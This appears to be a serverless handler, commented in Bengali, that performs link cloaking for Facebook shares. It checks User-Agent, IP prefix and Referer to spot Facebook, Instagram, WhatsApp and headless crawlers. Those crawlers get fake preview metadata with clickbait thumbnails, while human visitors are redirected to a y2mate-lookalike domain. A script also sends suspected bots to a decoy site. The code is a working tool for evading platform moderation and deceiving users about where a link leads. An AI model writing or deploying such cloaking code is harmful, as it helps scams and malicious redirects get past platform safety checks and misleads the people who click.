export default function handler(req, res) {
  // 🕵️‍♂️ ইউজারের User-Agent, Referer ও IP নেওয়া হচ্ছে
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const referer = (req.headers['referer'] || '').toLowerCase();
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';

  // 🤖 Facebook ও অন্যান্য সামাজিক বট চেক করা হচ্ছে
  const isFacebookBot = ua.includes('facebookexternalhit') ||
                        ua.includes('facebot') ||
                        ua.includes('facebookplatform') ||
                        ua.includes('instagram') ||
                        ua.includes('whatsapp') ||
                        ua.includes('threads');

  // 👻 Headless browser/automation tools চেকের জন্য ইউজার এজ
  const isHeadlessBotUA = ua.includes('headless') ||
                          ua.includes('puppeteer') ||
                          ua.includes('phantom') ||
                          ua.includes('selenium');

  // 🌐 IP ফিল্টার (Facebook এর কিছু IP নমুনা দেয়া হয়েছে, প্রয়োজনমতো বাড়াতে পারেন)
  const isValidIP = ip.startsWith('157.') || ip.startsWith('69.') || ip.startsWith('31.') || ip.startsWith('66.');

  // 🔗 Referer ফিল্টার (Facebook থেকে আসা কিনা যাচাই)
  const isValidReferer = referer.includes('facebook.com') || referer.includes('m.facebook.com');

  // 🖼️ Image গুলো map আকারে রাখছি, ডায়নামিক লিংক জন্য
  const imageMap = {
    tiger: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4vyWL6EJrmdmh5IOmt7cGz-GpxdLFgF5qHJTMzRFF0Rma1014mNEKrY8xdgkl952JsVR8HHdYHrlS5lqyFOp79YYzz4EGXCBO7C1Ah1TjMXvu1_4P2d_Zgw5UhBk-fNBmCS32gT4QlbGAxh308MgcUbevLfYoeqdlJ8XnFnFHSs2QjDAiWodQLAMa4E0/w640-h360/Tiger%203%20(1).jpg",
    fukrey: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjV8h2jPZtX_-ShGIm_cnS-Xsapzsb-fBASOYs-x0kcV8lfI_V4sDnnyK-K5flOh3-X-iQrjoZgIMCLYNb7193LGxkqz-77vPYgIGjzfRoCkgtiT8LLvtExoIjZgbeZpMHLVc8kTYKCq1KehWpkYZ5M-SjEUepPLal5L94AsJSXeFpN46nt8GEEkDgzam4/w640-h360/Tiger%20Nageswara%20Rao%20(2).jpg",
    jawan: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhJcg6a3__mSP5P6PZoMCrtxGBhx8e2F5jXtcIXXjR7s0VyCn_SyCO5AdOOe7VLlXNlpWarsOesgrZr53RYYHDRF4bCfIogKKOvjZrOL5YO_gKDU3cRpxWEIVHlnv2LhbrC6PJMOiK9inUconx_QtLPFZ_DlKX1RSa_jwwSe9TVbyTBJpnX2G-iWKjz_Qk/s768/maxresdefault-2024-05-01T152716.467-768x432.jpg",
    modi: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjEcFfn7xg4QkbsgZhCs1c0Dguof_CagppBUQut-6JocFI1guW4zjvU4GcYTSkZpHEpgOPlCEWm2iPYhd9x5exJx4Dylejotqtrm5AqsJ9SNutBN6KIxjciiRpQ2MPHKd-ef5atZRX7RYz6DAZ4YzTL5U-UFr2rR-L2Hyt6YJ5QqKqbvzKeR7Y1vDCgLDY/s1280/edited_thumbnail%20(3).png",
    girl: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPQxdjkTVp1sraxRyl-Tv3IdUK2lOvvYdZMKOYmpt8_Nwnzt4Hkgyq87HWdDBxAFzcjVA8gUg2OpF3Aaxu0hNwpieM-ZfOA_2dBRJVRwhfo4_n_uyOQTfZrGaoALU0MMzJiGVKulAwJCHu7ixu-KS5i5XqshXQNtYuP3OXWdmckoyReSVsjKhMvvrO2Yo/w640-h360/Tiger%20Nageswara%20Rao%20(1).jpg"
  };

  // 🔍 Query parameter থেকে img মান নেওয়া, না থাকলে default ইমেজ
  const imgParam = req.query.img || "default";

  // 📌 ডিফল্ট ইমেজ URL
  const defaultImage = "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQlAwNOpfJqPeV4sC3RoqdIXah6q4PFT8zFrkq_VAXcnhuz2O5pntQBZA_RatZ4OAH87I4d-kSpvHbDt7wlnnWRh16HS6hcb2WAvUm7KwiUDXI2U-5U7Dig9DW7PiRbOsNmwmuJp3p6nK9fWuieYjAV7CFDT-BkdzTazNPszL1BOpU9kfjyEQn7mBIND8/w640-h360/PF7wbYyurg0-HD.jpg";

  // 🏷️ imageMap থেকে imgParam অনুযায়ী image URL নিন, না থাকলে default image দিবেন
  const imageURL = (imageMap[imgParam] || defaultImage) + "?v=1"; // 🛡️ ক্যাশ বাইপাসের জন্য ?v=1 যোগ করা হয়েছে

  // 🔥 Facebook থেকে আসা বট হলে এবং IP ও referer ফিল্টার পাস করলে নিচের meta পাঠাবেন
  if ((isFacebookBot || isHeadlessBotUA) && (isValidReferer || isValidIP)) {
    res.setHeader('Content-Type', 'text/html');
    res.end(`
      <html>
        <head>
          <!-- 📡 Facebook Bot এর জন্য ফেক meta -->
          <meta property="og:title" content="&#8203;" />
          <meta property="og:description" content="" />
          <meta property="og:image" content="${imageURL}" />
          <meta property="og:url" content="https://example.com/empty" />

          <!-- 🎭 Double Cloaking: Bot কে meta দেখাবে, হিউম্যান কে JS redirect করবে -->
          <script>
            (function() {
              // 👾 Headless browser detect ও human interaction check
              let isBot = false;
              if (navigator.webdriver) isBot = true; // headless check
              if (window.outerWidth < 400 || window.outerHeight < 400) isBot = true; // স্ক্রিন সাইজ চেক
              try {
                localStorage.setItem('botCheck', 'yes');
              } catch(e) {
                isBot = true; // localStorage disabled হলে
              }

              let isHuman = false;
              window.addEventListener('mousemove', () => { isHuman = true; });
              window.addEventListener('scroll', () => { isHuman = true; });

              // ⏳ ৩ সেকেন্ড পর যদি বট হয় বা ইন্টারঅ্যাকশন না হয় তাহলে রিডাইরেক্ট
              setTimeout(() => {
                if (isBot || !isHuman) {
                  window.location.href = 'https://vercel.com'; // রিয়াল সাইট
                }
              }, 3000);
            })();
          </script>
        </head>
        <body>
          <p>Facebook বা Headless Bot Preview</p>
        </body>
      </html>
    `);
  } else {
    // 🧑‍🤝‍🧑 হিউম্যান ভিজিটরদের আসল সাইটে পাঠানো হবে
    res.writeHead(302, {
      Location: 'https://v6.www-y2mate.com'
    });
    res.end();
  }
}
